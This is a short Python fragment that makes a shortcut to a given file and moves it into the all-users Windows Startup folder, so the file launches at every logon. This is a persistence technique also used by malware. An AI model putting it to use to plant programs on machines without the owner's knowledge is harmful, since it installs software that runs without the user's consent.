from _improtpy import *
import pylink
from shutil import move


start_file = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"


def make(file):
    pylink.make(file)
    move(desktop + rf"\{os.path.split(file)[-1]}", start_file)
    